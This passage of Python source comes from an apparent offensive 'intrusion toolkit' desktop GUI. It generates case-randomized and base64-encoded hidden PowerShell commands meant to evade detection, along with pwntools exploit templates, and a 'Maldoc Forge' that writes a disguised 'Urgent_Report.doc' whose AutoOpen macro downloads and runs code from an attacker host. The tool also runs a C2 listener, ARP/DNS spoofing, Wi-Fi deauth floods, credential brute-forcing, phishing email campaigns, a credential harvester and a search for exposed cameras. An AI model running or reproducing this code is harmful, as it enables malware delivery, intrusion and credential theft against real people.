            output += f"\n\n# CASE-RANDOMIZED (Bypasses basic signature detection)\n"
            random_ps = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in "powershell -NoP -NonI -W Hidden -Exec Bypass")
            output += f"{random_ps} -Command \"{ps_cmd}\""
            
            output += f"\n\n# BASE64 ENCODED (Bypasses basic character filtering & advanced gatekeeping)\n"
            output += f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded_cmd}"
            
        self.result.setText(output)


class PwnToolsWizard(QDialog):
    """Wizard for generating binary exploitation templates"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("PWNTOOLS EXPLOIT WIZARD")
        self.resize(500, 400)
        self.setStyleSheet(STYLING)
        layout = QVBoxLayout(self)
        
        layout.addWidget(QLabel("EXPLOIT TYPE:", objectName="StatLabel"))
        self.type_combo = QComboBox()
        self.type_combo.addItems(["Buffer Overflow", "ROP Chain", "Format String", "Shellcode Injector"])
        self.type_combo.setStyleSheet(f"background:{AETHER_COLORS['bg_void']}; color:{AETHER_COLORS['accent_primary']};")
        layout.addWidget(self.type_combo)
        
        layout.addWidget(QLabel("BINARY PATH / TARGET:", objectName="StatLabel"))
        self.target = QLineEdit()
        self.target.setPlaceholderText("./vulnerable_binary")
        layout.addWidget(self.target)
        
        self.gen_btn = QPushButton("GENERATE EXPLOIT TEMPLATE")
        self.gen_btn.setObjectName("ProBtn")
        self.gen_btn.clicked.connect(self.generate)
        layout.addWidget(self.gen_btn)
        
        self.result = QTextEdit()
        self.result.setReadOnly(True)
        self.result.setPlaceholderText("Exploit code will appear here...")
        layout.addWidget(self.result)

    def generate(self):
        target = self.target.text() or "./exploit"
        etype = self.type_combo.currentText()
        
        template = f"from pwn import *\n\n# Context\ncontext.binary = '{target}'\ncontext.log_level = 'debug'\n\n"
        
        if etype == "Buffer Overflow":
            template += "io = process(context.binary.path)\n\n# Offset discovery\n# pattern = cyclic(1000)\n# io.sendline(pattern)\n\npayload = b'A' * 64 # Fill buffer\npayload += p64(0xdeadbeef) # Target Address\n\nio.sendline(payload)\nio.interactive()"
        elif etype == "ROP Chain":
            template += "elf = ELF(context.binary.path)\nrop = ROP(elf)\n\n# rop.system(next(elf.search(b'/bin/sh')))\nprint(rop.dump())\n\nio = process(elf.path)\nio.sendline(rop.chain())\nio.interactive()"
        else:
            template += "print('Interactive shell triggered...')\n# io = remote('target.com', 1337)\nio = process(context.binary.path)\nio.interactive()"
            
        self.result.setText(template)


class ToolExecutionDialog(QDialog):
    """
    Highly polished, dedicated UI view for running tools iteratively without spamming the main terminal.
    Contains progress indicators, elapsed time trackers, and a stylized grid for outputs.
    """
    def __init__(self, tool_id, target, parent=None):
        super().__init__(parent)
        self.tool_id = tool_id
        self.target = target
        self.start_time = time.time()
        self.setWindowTitle(f"{tool_id} Execution — {target}")
        self.resize(900, 600)
        
        from PySide6.QtGui import QIcon
        self.setWindowIcon(qta.icon("fa5s.terminal", color="#00ff41"))
        
        self.setup_ui()
        
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_elapsed)
        self.timer.start(1000)

    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        # Header 
        header_layout = QHBoxLayout()
        title = QLabel(f"<b style='color:#00ff41; font-size:16px;'>{self.tool_id} Payload Delivery</b>")
        self.time_lbl = QLabel("00:00")
        self.time_lbl.setStyleSheet("color: #888; font-family: monospace; font-size: 14px;")
        
        header_layout.addWidget(title)
        header_layout.addStretch()
        header_layout.addWidget(self.time_lbl)
        layout.addLayout(header_layout)

        # Progress
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0) # Indeterminate initially
        self.progress_bar.setTextVisible(False)
        self.progress_bar.setStyleSheet(f"""
            QProgressBar {{ border: 2px solid {AETHER_COLORS['bg_lighter']}; border-radius: 5px; background: {AETHER_COLORS['bg_dark']}; height: 8px; }}
            QProgressBar::chunk {{ background-color: {AETHER_COLORS['accent_primary']}; }}
        """)
        layout.addWidget(self.progress_bar)

        # Grid Data
        self.table = QTableWidget(0, 3)
        self.table.setHorizontalHeaderLabels(["Timestamp", "Severity", "Intelligence / Output Event"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self.table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self.table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self.table.setAlternatingRowColors(True)
        self.table.verticalHeader().setVisible(False)
        self.table.setShowGrid(False)
        self.table.setSelectionBehavior(QTableWidget.SelectRows)
        self.table.setStyleSheet(f"""
            QTableWidget {{ background: {AETHER_COLORS['bg_dark']}; color: #ddd; border: 1px solid {AETHER_COLORS['bg_lighter']}; border-radius: 6px; font-family: 'Consolas', monospace; font-size: 12px; }}
            QTableWidget::item {{ padding: 6px; }}
            QHeaderView::section {{ background-color: {AETHER_COLORS['bg_lighter']}; color: {AETHER_COLORS['accent_primary']}; font-weight: bold; border: None; padding: 4px; border-bottom: 2px solid {AETHER_COLORS['bg_dark']}; }}
        """)
        
        layout.addWidget(self.table)

        # Controls
        controls = QHBoxLayout()
        
        self.status_lbl = QLabel("<i style='color:#bbb'>Status: Active...</i>")
        controls.addWidget(self.status_lbl)
        
        controls.addStretch()
        
        self.export_btn = QPushButton("Export JSON")
        self.export_btn.setIcon(qta.icon("fa5s.download", color="white"))
        self.export_btn.setStyleSheet("padding: 6px 15px;")
        self.export_btn.setEnabled(False) # Enable on finish
        
        self.close_btn = QPushButton("Close")
        self.close_btn.setStyleSheet("padding: 6px 15px;")
        self.close_btn.clicked.connect(self.accept)
        
        controls.addWidget(self.export_btn)
        controls.addWidget(self.close_btn)
        layout.addLayout(controls)

    def update_elapsed(self):
        secs = int(time.time() - self.start_time)
        self.time_lbl.setText(f"{secs // 60:02d}:{secs % 60:02d}")

    @Slot(str, str)
    def append_event(self, text, severity):
        row = self.table.rowCount()
        self.table.insertRow(row)
        
        ts = time.strftime("%H:%M:%S")
        
        item_ts = QTableWidgetItem(ts)
        item_sev = QTableWidgetItem(severity)
        item_txt = QTableWidgetItem(text)
        
        # Styling based on severity
        color_map = {
            "INFO": AETHER_COLORS["accent_primary"],
            "WARN": AETHER_COLORS["accent_warning"],
            "ALERT": AETHER_COLORS["accent_error"],
            "SUCCESS": AETHER_COLORS["accent_success"],
        }
        fg_color = color_map.get(severity, "#aaaaaa")
        
        from PySide6.QtGui import QColor, QFont
        for it in (item_ts, item_sev, item_txt):
            it.setForeground(QColor(fg_color))
            if severity in ("ALERT", "SUCCESS"):
                f = QFont()
                f.setBold(True)
                it.setFont(f)
        
        self.table.setItem(row, 0, item_ts)
        self.table.setItem(row, 1, item_sev)
        self.table.setItem(row, 2, item_txt)
        
        self.table.scrollToBottom()

    @Slot()
    def execution_finished(self):
        self.timer.stop()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(100)
        self.progress_bar.setStyleSheet(f"""
            QProgressBar {{ border: 2px solid {AETHER_COLORS['bg_lighter']}; border-radius: 5px; background: {AETHER_COLORS['bg_dark']}; height: 8px; }}
            QProgressBar::chunk {{ background-color: {AETHER_COLORS['accent_success']}; }}
        """)
        self.status_lbl.setText("<b style='color:#39ff14'>Status: Complete.</b>")
        self.export_btn.setEnabled(True)

    @Slot(str)
    def execution_error(self, err_msg):
        self.timer.stop()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(100)
        self.progress_bar.setStyleSheet(f"""
            QProgressBar {{ border: 2px solid {AETHER_COLORS['bg_lighter']}; border-radius: 5px; background: {AETHER_COLORS['bg_dark']}; height: 8px; }}
            QProgressBar::chunk {{ background-color: {AETHER_COLORS['accent_error']}; }}
        """)
        self.status_lbl.setText(f"<b style='color:#ff003c'>Status: Critical Error ({err_msg}).</b>")
        
        self.append_event(f"Unhandled Exception: {err_msg}", "ALERT")

class ToolkitPage(QWidget):
    """Simplified click-driven interface for industrial tools"""
    log_signal = Signal(str, str)

    def __init__(self, parent_app=None):
        super().__init__(parent_app)
        self.app = parent_app
        self.log_terminal = parent_app.term.log if parent_app else None
        self.engines = parent_app.engines if parent_app else None
        self.log_signal.connect(self._safe_log)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30,30,30,30)
        layout.addWidget(QLabel("INTRUSION TOOLKIT", objectName="Title"))

        # Category definitions: (category_label, btn_object_name, accent_color, tools_list)
        # Each tool: (internal_name, display_label, description, icon)
        tool_categories = [
            ("RECONNAISSANCE", "ToolBtnRecon", AETHER_COLORS["cat_recon"], [
                ("NMAP",      "NMAP",      "Port & Service Discovery",     "fa5s.network-wired"),
                ("SHODAN",    "SHODAN",    "Internet Intelligence (OSINT)", "fa5s.globe"),
                ("PYSHARK",   "PYSHARK",   "Live Packet Capture",          "fa5s.microchip"),
                ("STALK",     "STALK",     "Network Asset Discovery",      "fa5s.eye"),
                ("CCTV_CAM",  "CCTV_CAM",  "Exposed Camera Recon",         "fa5s.video"),
                ("PHOTON",    "PHOTON",    "OSINT Web Crawler & Intel",    "fa5s.spider"),
                ("SPOODLE",   "SPOODLE",   "Mass Subdomain & SSL Scanner", "fa5s.search"),
                ("BLOODHOUND","BLOODHOUND","AD Enumeration (Ingestor)",    "fa5s.project-diagram"),
            ]),
            ("WEB APPLICATION", "ToolBtnWeb", AETHER_COLORS["cat_web"], [
                ("SQLMAP",    "SQLMAP",    "SQL Injection Engine",          "fa5s.database"),
                ("XSSTRIKE",  "XSSTRIKE",  "Cross-Site Scripting Suite",    "fa5s.bug"),
                ("GOBUSTER",  "GOBUSTER",  "Directory & File Enumeration",  "fa5s.folder-open"),
                ("WAPITI",    "WAPITI",    "Web Vulnerability Scanner",     "fa5s.spider"),
                ("HTTPIE",    "HTTPIE",    "Advanced HTTP Client",          "fa5s.bolt"),
                ("DIRSEARCH", "DIRSEARCH", "Web Path Brute-Forcer",        "fa5s.search-location"),
                ("SELENIUM",  "SELENIUM",  "Dynamic Headless Web Testing", "fa5b.chrome"),
            ]),
            ("NETWORK OPERATIONS", "ToolBtnNetworkOp", AETHER_COLORS["cat_recon"], [
                ("LIBDNET",   "LIBDNET",   "Bare-Metal Net Interfaces",    "fa5s.ethernet"),
                ("DPKT",      "DPKT",      "PCAP Parser & Analysis",       "fa5s.wave-square"),
                ("HABU",      "HABU",      "Network Hacking Toolkit",      "fa5s.tools"),
            ]),
            ("EXPLOITATION", "ToolBtnExploit", AETHER_COLORS["cat_exploit"], [
                ("HYDRA",         "HYDRA",         "Credential Brute-Force",        "fa5s.key"),
                ("METASPLOIT",    "METASPLOIT",    "Exploitation Framework",        "fa5s.biohazard"),
                ("PWNTOOLS",      "PWNTOOLS",      "Binary Exploitation Kit",       "fa5s.vial"),
                ("MONA",          "MONA",          "Pattern Generation (BoF)",      "fa5s.scroll"),
                ("MSFVENOM",      "MSFVENOM",      "Payload Generation",            "fa5s.hammer"),
                ("REVERSE_SHELL", "REVERSE SHELL", "Reverse Shell Generator",       "fa5s.terminal"),
                ("CRACKMAP",      "CRACKMAPEXEC",  "Network Auth Suite (CME)",      "fa5s.bullseye"),
            ]),
            ("SOCIAL ENGINEERING", "ToolBtnSocial", AETHER_COLORS["cat_social"], [
                ("MALDOC",         "MALDOC",         "Weaponized Document Forge",      "fa5s.file-word"),
                ("CRED_HARVESTER", "CRED HARVEST",   "Credential Harvester",           "fa5s.user-secret"),
                ("SMTP_PHISH",     "SMTP PHISH",     "SMTP Phishing Campaign",         "fa5s.envelope-open-text"),
                ("TWITTER_PHISH",  "TWITTER PHISH",  "Spear Phish (Twitter OSINT)",    "fa5b.twitter"),
            ]),
            ("WIRELESS", "ToolBtnWireless", AETHER_COLORS["cat_wireless"], [
                ("WIFI_PUMP", "WIFI",    "Wireless Assessment Suite",  "fa5s.wifi"),
                ("BT_SCAN",   "BT SCAN", "Bluetooth Reconnaissance",   "fa5s.broadcast-tower"),
            ]),
        ]

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        container = QWidget()
        master_layout = QVBoxLayout(container)
        master_layout.setSpacing(24)
        scroll.setWidget(container)

        for cat_label, btn_obj_name, accent_color, tools in tool_categories:
            # Category header
            header = QLabel(cat_label)
            header.setStyleSheet(
                f"color: {accent_color}; font-size: 11px; font-weight: 700; "
                f"letter-spacing: 2px; padding: 4px 0; "
                f"border-bottom: 1px solid {AETHER_COLORS['border_subtle']}; margin-bottom: 4px;"
            )
            master_layout.addWidget(header)

            grid = QGridLayout()
            grid.setSpacing(12)
            for i, (name, display, desc, icon) in enumerate(tools):
                btn = QPushButton(f"  {display}")
                btn.setObjectName(btn_obj_name)
                btn.setIcon(qta.icon(icon, color=accent_color))
                btn.setIconSize(QSize(20, 20))
                btn.setMinimumHeight(72)
                btn.setCursor(Qt.PointingHandCursor)
                btn.clicked.connect(lambda ch, n=name: self.run_tool(n))

                lbl = QLabel(desc)
                lbl.setAlignment(Qt.AlignCenter)
                lbl.setStyleSheet(
                    f"color: {AETHER_COLORS['text_dim']}; font-size: 11px; "
                    f"font-weight: 500; margin-bottom: 6px;"
                )

                box = QVBoxLayout()
                box.setSpacing(2)
                box.addWidget(btn)
                box.addWidget(lbl)
                grid.addLayout(box, i // 4, i % 4)

            master_layout.addLayout(grid)

        layout.addWidget(scroll)
        layout.addStretch()

    def log(self, text, color=None):
        self.log_signal.emit(str(text), color or AETHER_COLORS["accent_success"])

    def _safe_log(self, text, color):
        if self.log_terminal:
            self.log_terminal(text, color)
        else:
            print(text)

    def _run_unified_engine(self, engine_id, target, params=None, display_name=None):
        if not self.engines or engine_id not in self.engines:
            self.log(f"[{engine_id.upper()}] Engine not registered.", AETHER_COLORS["accent_error"])
            return

        engine = self.engines[engine_id]
        display_name = display_name or engine_id.upper()
        
        # Switch to Reconnaissance Page (Index 1)
        if self.app:
            self.app.switch_page(1)
            self.app.op_lbl.setText(f"ACTIVE: {display_name} ON {target}")
            self.app.target.setText(target)
        
        self.log(f"[{display_name}] Initiating operation on {target}...", AETHER_COLORS["accent_info"])
        
        from engines.base import Request as EngRequest
        req = EngRequest(target=target, params=params or {})
        
        # We can reuse ToolEngineWorker but connect it to our log instead of a dialog
        self.worker = ToolEngineWorker(engine, req)
        self.worker.progress.connect(self.log)
        self.worker.error.connect(lambda e: self.log(f"[{display_name} ERR] {e}", AETHER_COLORS["accent_error"]))
        self.worker.finished.connect(lambda: self.log(f"[{display_name}] Execution complete.", AETHER_COLORS["accent_success"]))
        self.worker.start()

    def run_tool(self, name):
        import subprocess
        import os
        from PySide6.QtWidgets import QInputDialog
        
        try:
            if self.app:
                self.app.switch_page(1)

            if name == "NMAP":
                target, ok = QInputDialog.getText(self, "NMAP", "Enter Target IP/Domain:", text="127.0.0.1")
                if ok:
                    ports, ok2 = QInputDialog.getText(self, "NMAP Ports", "Enter Port Range (e.g. 1-1024 or leave empty for common):", text="1-1024")
                    if ok2:
                        self._run_unified_engine("nmap", target, {"ports": ports}, display_name="NMAP")

            elif name == "SHODAN":
                settings = self.engines.get("settings")
                key = settings.data.get("shodan_key") if settings else os.getenv("SHODAN_API_KEY")

                if not key:
                    key, ok = QInputDialog.getText(self, "Shodan API", "Enter SHODAN API KEY:")
                    if not ok: return

                target, ok = QInputDialog.getText(self, "SHODAN", "Enter Target IP:")
                if ok:
                    if self.app: self.app.op_lbl.setText(f"ACTIVE: SHODAN ON {target}")
                    self.log(f"[SHODAN] Querying intelligence for {target}...", AETHER_COLORS["cat_recon"])
                    try:
                        import shodan
                        api = shodan.Shodan(key)
                        res = api.host(target)
                        self.log(f"[SHODAN] OS: {res.get('os', 'Unknown')}")
                        self.log(f"[SHODAN] ISP: {res.get('isp', 'Unknown')}")
                        self.log(f"[SHODAN] Org: {res.get('org', 'Unknown')}")
                        for item in res['data']:
                            banner = item.get('data', '').strip()[:80].replace('\n', ' ')
                            self.log(f"[SHODAN] :{item['port']} {item.get('product', 'Unknown')} | {banner}")
                    except Exception as e:
                        self.log(f"[SHODAN] Error: {e}", AETHER_COLORS["accent_error"])

            elif name == "PYSHARK":
                modes = ["sniff (PyShark)", "arp_spoof (Scapy)", "syn_scan (Scapy)", "dns_spoof (Scapy)"]
                mode_choice, ok = QInputDialog.getItem(self, "Packet Engine", "Select Operation Mode:", modes, 0, False)
                if not ok: return
                
                mode = mode_choice.split()[0]
                iface, ok = QInputDialog.getText(self, "Packet Engine", "Interface (empty for default):", text="")
                if not ok: return

                params = {"mode": mode, "iface": iface}
                
                if mode == "sniff":
                    count, ok = QInputDialog.getInt(self, "Packet Engine", "Packet Count:", 50, 1, 10000)
                    if ok: params["packet_count"] = count
                    bpf, ok = QInputDialog.getText(self, "Packet Engine", "BPF Filter (e.g. 'tcp port 80'):")
                    if ok: params["bpf_filter"] = bpf
                
                elif mode == "arp_spoof":
                    target, ok = QInputDialog.getText(self, "Packet Engine", "Target IP:")
                    gw, ok2 = QInputDialog.getText(self, "Packet Engine", "Gateway IP:")
                    if ok and ok2:
                        params.update({"arp_target": target, "arp_gateway": gw, "arp_interval": 2.0})
                    else: return

                elif mode == "syn_scan":
                    target, ok = QInputDialog.getText(self, "Packet Engine", "Target IP:")
                    if ok: params["syn_target"] = target
                    else: return

                elif mode == "dns_spoof":
                    host, ok = QInputDialog.getText(self, "Packet Engine", "Hostname to spoof:")
                    fake_ip, ok2 = QInputDialog.getText(self, "Packet Engine", "Fake IP (redirect to):")
                    if ok and ok2:
                        params["dns_spoof_map"] = {host: fake_ip}
                    else: return

                self._run_unified_engine("packet", iface or "default", params, display_name=f"PACKET:{mode.upper()}")

            elif name == "SQLMAP":
                url, ok = QInputDialog.getText(self, "SQL Injection", "Target URL with params:", text="http://127.0.0.1/page?id=1")
                if ok:
                    self._run_unified_engine("sqli", url, display_name="SQLi")

            elif name == "HYDRA":
                mode, ok0 = QInputDialog.getItem(self, "Hydra", "Select Attack Mode:", ["HTTP Basic", "HTTP Form (POST)"], 0, False)
                if not ok0: return

                target, ok = QInputDialog.getText(self, "HYDRA", "Target URL:")
                user, ok2 = QInputDialog.getText(self, "HYDRA", "Username:")
                if ok and ok2:
                    wordlist = self.engines["settings"].data.get("fuzz_wordlist") if self.engines else ""
                    if not wordlist or not os.path.exists(wordlist):
                        wordlist, ok3 = QInputDialog.getText(self, "HYDRA", "Wordlist Path:")
                        if not ok3: return

                    if mode == "HTTP Basic":
                        self.log(f"[HYDRA] Credential attack (Basic Auth) on {target} as {user}...", AETHER_COLORS["cat_exploit"])
                        def run_basic():
                            if self.engines: self.engines["brute"].brute_http_basic(target, user, wordlist, callback=self.log)
                        threading.Thread(target=run_basic, daemon=True).start()
                    else:
                        u_field, ok4 = QInputDialog.getText(self, "HYDRA", "Username Field Name:", text="username")
                        p_field, ok5 = QInputDialog.getText(self, "HYDRA", "Password Field Name:", text="password")
                        f_msg, ok6 = QInputDialog.getText(self, "HYDRA", "Failure Indicator (in HTML):", text="Login failed")
                        if ok4 and ok5 and ok6:
                            self.log(f"[HYDRA] Credential attack (Form POST) on {target}...", AETHER_COLORS["cat_exploit"])
                            def run_form():
                                if self.engines: self.engines["brute"].brute_http_form(target, u_field, p_field, user, wordlist, failure_msg=f_msg, callback=self.log)
                            threading.Thread(target=run_form, daemon=True).start()

            elif name == "METASPLOIT":
                port, ok = QInputDialog.getInt(self, "METASPLOIT", "LPORT (Listener Port):", 4444)
                if ok:
                    if not hasattr(self, "msf_handler") or not self.msf_handler.is_alive():
                        self.log(f"[MSF] Deploying C2 listener on :{port}...", AETHER_COLORS["cat_exploit"])
                        self.msf_handler = CommandHandlerEngine(port, callback=self.log)
                        self.msf_handler.start()
                    
                    sid, ok_sid = QInputDialog.getInt(self, "METASPLOIT", "Session ID:", 0)
                    if ok_sid:
                        cmd, ok2 = QInputDialog.getText(self, "METASPLOIT", f"Command for session {sid}:")
                        if ok2 and cmd:
                            self.msf_handler.send_cmd(cmd, session_id=sid)

            elif name == "PWNTOOLS":
                wiz = PwnToolsWizard(self)
                wiz.exec()

            elif name == "MONA":
                length, ok = QInputDialog.getInt(self, "MONA", "Pattern Length:", 1000)
                if ok:
                    try:
                        from pwn import cyclic
                        pat = cyclic(length).decode()
                    except:
                        pat = "Aa0Aa1Aa2Aa3..."
                    self.log(f"[MONA] Cyclic pattern ({length}B): {pat[:64]}...", AETHER_COLORS["cat_exploit"])

            elif name == "GOBUSTER":
                target, ok = QInputDialog.getText(self, "GOBUSTER", "Target URL:", text="http://127.0.0.1")
                if ok:
                    wordlist = self.engines["settings"].data.get("fuzz_wordlist") if self.engines else None
                    if not wordlist or not os.path.exists(wordlist):
                        wordlist, ok = QInputDialog.getText(self, "GOBUSTER", "Wordlist Path (leave empty for default):")
                        if not ok: return

                    def run_gobuster():
                        import asyncio
                        from pybuster import PyBusterEngine, PyBusterConfig

                        async def _scan():
                            config = PyBusterConfig(
                                target=target,
                                wordlist_path=wordlist if wordlist else "wordlist.txt",
                                threads=200,
                                extensions=["php", "js", "css"],
                                recursive=True
                            )

                            async with PyBusterEngine(config) as engine:
                                engine.set_callback(lambda res: self.log(f"[GOBUSTER] {res['status']} {res['path']}  [{res['size']}B]"))
                                results = await engine.scan()
                                return results

                        try:
                            self.log(f"[GOBUSTER] Directory enumeration on {target}...", AETHER_COLORS["cat_web"])
                            results = asyncio.run(_scan())
                            self.log(f"[GOBUSTER] Complete. {len(results)} endpoint(s) discovered.", AETHER_COLORS["accent_success"])
                        except Exception as e:
                            self.log(f"[GOBUSTER] Error: {e}", AETHER_COLORS["accent_error"])

                    threading.Thread(target=run_gobuster, daemon=True).start()

            elif name == "MSFVENOM" or name == "REVERSE_SHELL":
                self.log("[PAYLOAD] Opening payload generator...", AETHER_COLORS["cat_exploit"])
                wiz = PayloadWizard(self)
                wiz.exec()

            elif name == "MALDOC":
                lhost, ok1 = QInputDialog.getText(self, "Maldoc Forge", "LHOST (Attacker IP):", text="10.10.10.10")
                lport, ok2 = QInputDialog.getText(self, "Maldoc Forge", "LPORT (Attacker Port):", text="4444")
                if not (ok1 and ok2): return
                self.log("[MALDOC] Initializing polyglot document forge...", AETHER_COLORS["cat_social"])
                
                def create_maldoc_pdf():
                    try:
                        import base64
                        from pathlib import Path
                        ps_payload = f"powershell -NoP -NonI -W Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/s')\""
                        b64_payload = base64.b64encode(ps_payload.encode('utf-16le')).decode()
                        vba_stager = f"Sub AutoOpen()\n  Shell(\"powershell -EncodedCommand {b64_payload}\")\nEnd Sub"
                        mht_template = f"MIME-Version: 1.0\nContent-Type: multipart/related; boundary=\"----=_NextPart_01DAB6F2.E8A6B0A0\"\n\n------=_NextPart_01DAB6F2.E8A6B0A0\nContent-Location: file:///C:/user/template.htm\nContent-Type: text/html; charset=\"utf-8\"\n\n<html><head><meta name=Generator content=\"Microsoft Word 15\"><link rel=Edit-Time-Data href=\"vbaProject.bin.mso\"></head><body><p>This document requires Microsoft Word to be viewed correctly.</p></body></html>\n\n------=_NextPart_01DAB6F2.E8A6B0A0\nContent-Location: vbaProject.bin.mso\nContent-Type: application/x-mso\n\n# {vba_stager}\n[VBA_PROJECT_DATA_PLACEHOLDER]\n\n------=_NextPart_01DAB6F2.E8A6B0A0--\n"
                        pdf_header = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 50 >>\nstream\nBT /F1 12 Tf 70 700 Td (Please open this file in Word) Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000056 00000 n\n0000000111 00000 n\n0000000212 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n312\n%%EOF\n"
                        polyglot_data = pdf_header.encode() + mht_template.encode()
                        downloads_path = Path(os.path.join(os.environ['USERPROFILE'], 'Downloads'))
                        save_path = downloads_path / "Urgent_Report.doc"
                        with open(save_path, "wb") as f:
                            f.write(polyglot_data)
                        self.log(f"[MALDOC] Document generated successfully: {save_path}", AETHER_COLORS["accent_success"])
                    except Exception as e:
                        self.log(f"[MALDOC] Error: {e}", AETHER_COLORS["accent_error"])
                threading.Thread(target=create_maldoc_pdf, daemon=True).start()

            elif name == "WIFI_PUMP":
                mode, ok0 = QInputDialog.getItem(self, "WIFI", "Select Operation:", ["Passive Scan", "Deauth Flood"], 0, False)
                if not ok0: return
                if mode == "Passive Scan":
                    iface, ok = QInputDialog.getText(self, "WIFI", "Interface:", text="wlan0")
                    if ok:
                        self.log(f"[WIFI] Passive AP discovery on {iface}...", AETHER_COLORS["cat_wireless"])
                        def run_wifi_scan():
                            if self.engines: self.engines["wifi"].scan_aps(iface, callback=self.log)
                        threading.Thread(target=run_wifi_scan, daemon=True).start()
                else:
                    tmac, ok1 = QInputDialog.getText(self, "WIFI", "Target BSSID/MAC:")
                    gmac, ok2 = QInputDialog.getText(self, "WIFI", "Gateway MAC:")
                    if ok1 and ok2:
                        self.log(f"[WIFI] Deauth flood targeting {tmac}...", AETHER_COLORS["cat_wireless"])
                        if self.engines: self.engines["wifi"].deauth(tmac, gmac, "wlan0", callback=self.log)

            elif name == "CRED_HARVESTER":
                port, ok = QInputDialog.getInt(self, "CRED HARVEST", "Listen Port (HTTP):", 8080)
                if ok:
                    templates = ["Microsoft 365", "Google", "Custom"]
                    template, ok_t = QInputDialog.getItem(self, "CRED HARVEST", "Select Landing Page:", templates, 2, False)
                    if ok_t:
                        self.log(f"[HARVEST] Deploying '{template}' harvester on :{port}...", AETHER_COLORS["cat_social"])
                        if self.engines: self.engines["harvester"].start_local_harvester(port, template_name=template, callback=self.log)

            elif name == "BT_SCAN":
                self.log("[BT] Bluetooth module is temporarily disabled (driver-level stability issue).", AETHER_COLORS["accent_warning"])

            elif name == "SMTP_PHISH":
                target, ok = QInputDialog.getText(self, "SMTP PHISH", "Target Email:", text="victim@example.com")
                if ok and target:
                    sender, ok = QInputDialog.getText(self, "SMTP PHISH", "Sender Gmail Address:")
                    app_pw, ok2 = QInputDialog.getText(self, "SMTP PHISH", "App Password (16 chars):")
                    if ok and ok2:
                        templates = list(EmailPhisher.TEMPLATES.keys())
                        tpl, ok3 = QInputDialog.getItem(self, "SMTP PHISH", "Select Template:", templates, 0, False)
                        url, ok4 = QInputDialog.getText(self, "SMTP PHISH", "Phishing URL:", text="http://10.10.10.5:8080")
                        if ok3 and ok4:
                            self.log(f"[PHISH] SMTP campaign targeting {target}...", AETHER_COLORS["cat_social"])
                            def _run_phish():
                                phisher = EmailPhisher(sender_email=sender, app_password=app_pw.replace(" ", ""))
                                if phisher.test_connection(callback=self.log):
                                    phisher.mass_send([target], tpl, url, "ACME Corp", callback=self.log)
                            threading.Thread(target=_run_phish, daemon=True).start()

            elif name == "STALK":
                self._run_unified_engine("stalk", "local_network")

            elif name == "CCTV_CAM":
                country, ok = QInputDialog.getText(self, "CCTV Cam Hunter", "Country Code (ISO 2-letter, e.g. US, JP):", text="US")
                if ok and country:
                    pages, ok2 = QInputDialog.getInt(self, "CCTV Cam Hunter", "Max pages per source:", 3, 1, 50)
                    if ok2:
                        sources, ok3 = QInputDialog.getText(self, "CCTV Cam Hunter", "Sources (comma-separated: insecam, earthcam, opentopia, webcamtaxi, camstreamer) or leave empty for all:", text="")
                        if ok3:
                            params = {"country_code": country, "max_pages": pages}
                            if sources.strip():
                                params["sources"] = sources.strip()
                            self._run_unified_engine("cctv_cam", country, params)

            elif name == "PHOTON":
                url, ok = QInputDialog.getText(self, "Photon", "Target URL:", text="http://")
                if ok:
                    self._run_unified_engine("photon", url)

            elif name == "CRACKMAP":
                target, ok = QInputDialog.getText(self, "CrackMapExec", "Target IP/Range:", text="192.168.1.0/24")
                if ok:
                    proto, ok1 = QInputDialog.getItem(self, "CME Protocol", "Select Protocol:", ["smb", "ssh", "ldap", "mssql", "wmi", "winrm", "rdp", "vnc", "ftp"], 0, False)
                    args, ok2 = QInputDialog.getText(self, "CME Args", "Additional Args:", text="-u Admin -p Password")
                    if ok1 and ok2:
                        self._run_unified_engine("crackmapexec", target, {"protocol": proto, "args": args})

            elif name == "XSSTRIKE":
                url, ok = QInputDialog.getText(self, "XSStrike", "Target URL:", text="http://")
                if ok:
                    self._run_unified_engine("xsstrike", url)

            elif name == "HTTPIE":
                url, ok = QInputDialog.getText(self, "HTTPie", "Target URL:", text="http://")
                if ok:
                    self._run_unified_engine("httpie", url)

            elif name == "WAPITI":
                url, ok = QInputDialog.getText(self, "Wapiti", "Target URL:", text="http://")
                if ok:
                    self._run_unified_engine("wapiti", url)

            elif name == "LIBDNET":
                self._run_unified_engine("libdnet", "localhost", {"mode": "arp_cache"})

            elif name == "DPKT":
                pcap, ok = QInputDialog.getText(self, "DPKT", "Path to .pcap file:")
                if ok:
                    self._run_unified_engine("dpkt", pcap)

            elif name == "BLOODHOUND":
                domain, ok = QInputDialog.getText(self, "BloodHound", "Target Domain:")
                if ok:
                    self._run_unified_engine("bloodhound", domain)

            elif name == "SPOODLE":
                target, ok = QInputDialog.getText(self, "Spoodle", "Target Domain:")
                if ok:
                    self._run_unified_engine("spoodle", target)

            elif name == "HABU":
                modules = ["Network Recon (net)", "Crypto Ops (crypto)", "Fernet Symmetric (fernet)", "Asymmetric RSA (asym)", "Shodan OSINT (shodan)", "Censys OSINT (censys)"]
                mod_choice, ok = QInputDialog.getItem(self, "Habu Engine", "Select Module:", modules, 0, False)
                if not ok: return
                
                module = mod_choice.split("(")[1].replace(")", "")
                params = {"module": module}
                target = None

                if module == "net":
